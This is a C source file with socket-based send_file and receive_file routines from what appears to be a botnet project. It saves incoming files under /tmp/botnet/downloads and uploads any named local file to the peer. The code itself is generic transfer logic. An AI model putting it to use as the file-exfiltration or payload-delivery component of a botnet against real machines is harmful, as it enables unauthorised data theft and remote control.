#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h> 
#include <stdint.h>
#include <endian.h>
#include <unistd.h> // For getpid()

#include "../include/logging.h"
#include "../include/send_message.h"
#include "../include/file_exchange.h"


//RECEIVING PART

int receive_file(int socket, const char *filename ){

    // Extract only the filename from the path
    const char *just_filename = filename;
    const char *slash = strrchr(filename, '/');
    if (slash) {
        just_filename = slash + 1;
    }

    // Construire le chemin complet du fichier dans le répertoire du client
    char fullpath[512];
    snprintf(fullpath, sizeof(fullpath), "/tmp/botnet/downloads/%s", just_filename);

    // Ouvrir le fichier pour l'écriture
    FILE *fp = fopen(fullpath, "wb");
    if (!fp) {
        output_log("Error: Could not open file %s for writing\n", LOG_ERROR, LOG_TO_ALL, fullpath);
        return -1;
    }

    char buffer[FILE_CHUNK_SIZE];

    // Lire la taille du fichier (8 octets)
    uint64_t filesize_net;
    ssize_t n = recv(socket, &filesize_net, sizeof(filesize_net), MSG_WAITALL);
    if (n != sizeof(filesize_net)) {
        output_log("Error: Could not read file size\n", LOG_ERROR, LOG_TO_ALL);
        fclose(fp);
        return -1;
    }

    uint64_t filesize = be64toh(filesize_net);

    // Lire exactement filesize octets
    uint64_t total_received = 0;
    while (total_received < filesize) {
        size_t to_read = (filesize - total_received > FILE_CHUNK_SIZE) ? FILE_CHUNK_SIZE : (filesize - total_received);
        ssize_t bytes_received = recv(socket, buffer, to_read, 0);
        if (bytes_received <= 0) break;
        fwrite(buffer, 1, bytes_received, fp);
        total_received += bytes_received;
        output_log("handle_download : Received EOF signal from client socket %d\n", LOG_DEBUG, LOG_TO_ALL, socket);

    }

    fclose(fp);
    if (total_received != filesize) {
        output_log("Error: File transfer incomplete\n", LOG_ERROR, LOG_TO_ALL);
        return -1;
    }

    output_log("File '%s' received successfully and saved to '%s'\n", LOG_INFO, LOG_TO_ALL, filename, fullpath);
    return -99;
}

// SENDING PART
bool send_file(int socket, const char *filename) {
    // Strip quotes from the filename if present
    char stripped_filename[1024];
    snprintf(stripped_filename, sizeof(stripped_filename), "%s", filename);
    size_t len = strlen(stripped_filename);
    if (stripped_filename[0] == '"' && stripped_filename[len - 1] == '"') {
        stripped_filename[len - 1] = '\0'; // Remove End "
        memmove(stripped_filename, stripped_filename + 1, len - 1); // Remove first "
    }

    // Create a copy of the file
    // Prevents attempting to send a file that is dynamically changing
    char tmpfile[1024];
    snprintf(tmpfile, sizeof(tmpfile), "/tmp/botnet_filesend.tmp");
    FILE *src = fopen(stripped_filename, "rb");
    FILE *dst = fopen(tmpfile, "wb");
    if (!src || !dst) { // Issue opening, then close handles (and delete temp file if it was connected)
        if (src) fclose(src);
        if (dst) fclose(dst);
        output_log("send_file : Error opening file or creating temp file", LOG_ERROR, LOG_TO_ALL, tmpfile);
        send_message(socket, "ERROR: Could not open file / create temp file");
        if (dst) unlink(tmpfile);
        return false;
    }
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, n, dst);
    }
    fclose(src);
    fclose(dst);

    // --- Use the copy for sending ---
    FILE *fp = fopen(tmpfile, "rb");
    if (!fp) {
        output_log("send_file : Temp file was not found", LOG_ERROR, LOG_TO_ALL, tmpfile);
        send_message(socket, "ERROR: Temp file not found");
        unlink(tmpfile);
        return false;
    }
    struct stat st;
    if (stat(tmpfile, &st) != 0) {
        output_log("send_file : Error getting file stats", LOG_ERROR, LOG_TO_ALL, tmpfile);
        fclose(fp);
        unlink(tmpfile);
        return false;
    }
    uint64_t filesize = (uint64_t) st.st_size;
    uint64_t filesize_net = htobe64(filesize); // conversion réseau

    // Envoie du nom de fichier (still use original name for protocol)
    char header[1024];
    snprintf(header, sizeof(header), "UPLOAD%s", stripped_filename);
    if (send(socket, header, strlen(header), 0) < 0) {
        output_log("send_file : Error sending file data header", LOG_ERROR, LOG_TO_ALL, stripped_filename);
        fclose(fp);
        unlink(tmpfile);
        return false;
    }
    usleep(100000); // petite pause pour éviter que le header soit collé au reste

    // Envoie la taille du fichier (8 octets)
    if (send(socket, &filesize_net, sizeof(filesize_net), 0) < 0) {
        output_log("send_file : Error sending file size", LOG_ERROR, LOG_TO_ALL, stripped_filename);
        fclose(fp);
        unlink(tmpfile);
        return false;
    }
    // Envoie des données en chunks de taille 4096
    char buffer[FILE_CHUNK_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, FILE_CHUNK_SIZE, fp)) > 0) {
        if (send(socket, buffer, bytes_read, 0) < 0) {
            output_log("send_file : Error sending file data", LOG_ERROR, LOG_TO_ALL, stripped_filename);
            fclose(fp);
            unlink(tmpfile);
            return false;
        }
    }

    fclose(fp);
    unlink(tmpfile);

    output_log("File '%s' sent successfully\n", LOG_INFO, LOG_TO_ALL, stripped_filename);
    return true;
}